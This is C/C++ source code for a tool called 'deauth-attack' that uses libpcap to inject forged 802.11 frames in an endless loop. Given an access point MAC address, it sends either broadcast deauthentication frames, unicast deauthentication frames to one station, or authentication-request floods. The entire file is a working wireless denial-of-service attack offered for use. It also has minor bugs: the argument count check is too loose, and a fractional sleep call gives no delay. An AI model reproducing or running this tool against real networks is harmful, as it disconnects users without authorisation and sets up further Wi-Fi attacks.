#include "ieee80211_h.h"

struct Para para;
//bool pcap_print(u_char *buf);

void usage() {
	printf("syntax: deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
	printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}
typedef struct {
        char* dev_;
} Param;
Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
    putMac(&para.ap,argv[2]);//para.ap = mac - static option
    if(argc > 3){//dynamic option
        for(int i = 3;i < argc;i++){
            if(strcmp(argv[i],"-auth")){
                putMac(&para.sta,argv[i]);
                para.pbit[0] = 1;// sta option
            }else{
                para.pbit[1] = 1;// auth option
            }
        }
    }
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

    int bit = 0;
	char errbuf[PCAP_ERRBUF_SIZE];
    char frame_buf[BUFSIZ];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
    //printMac(&para.ap);
    //printMac(&para.sta);
    while(1)
    {
        if(para.pbit[1] == 1){//if auth Attack
            memcpy(frame_buf,AUTH_REQ,43);
            memcpy(&frame_buf[13+4],&para.ap,6);
            memcpy(&frame_buf[13+4+6],&para.sta,6);
            memcpy(&frame_buf[13+4+6+6],&para.ap,6);
            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),43);
            for(int i=0; i < 26;i++){
                printf("%.2x",(unsigned int)frame_buf[i]);
            }
            printf("\n");
        }else{//if deauth Attack
            if(para.pbit[0] == 1){// ucast
                memcpy(frame_buf,DEAUTH_REQ,26+13);
                if(bit == 0){//ap -> sta
                    bit = 1; 
                    memcpy(&frame_buf[13+4],&para.sta,6);
                    memcpy(&frame_buf[13+4+6],&para.ap,6);
                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
                }else{//sta->ap
                    bit = 0; 
                    memcpy(&frame_buf[13+4],&para.ap,6);
                    memcpy(&frame_buf[13+4+6],&para.sta,6);
                    memcpy(&frame_buf[13+4+6+6],&para.ap,6);
                }
                for(int i=0; i < 26;i++){
                    printf("%.2x",(unsigned int)frame_buf[i]);
                }
            	printf("\n");
            }else{//bcast
                memcpy(frame_buf,DEAUTH_REQ,26+13);
                memcpy(&frame_buf[13+4+6],&para.ap,6);
                memcpy(&frame_buf[13+4+6+6],&para.ap,6);
            }
            pcap_sendpacket(pcap,reinterpret_cast<const u_char*>(frame_buf),26+13);
        }
        //send packet
        sleep(0.1);
    }
	pcap_close(pcap);
}
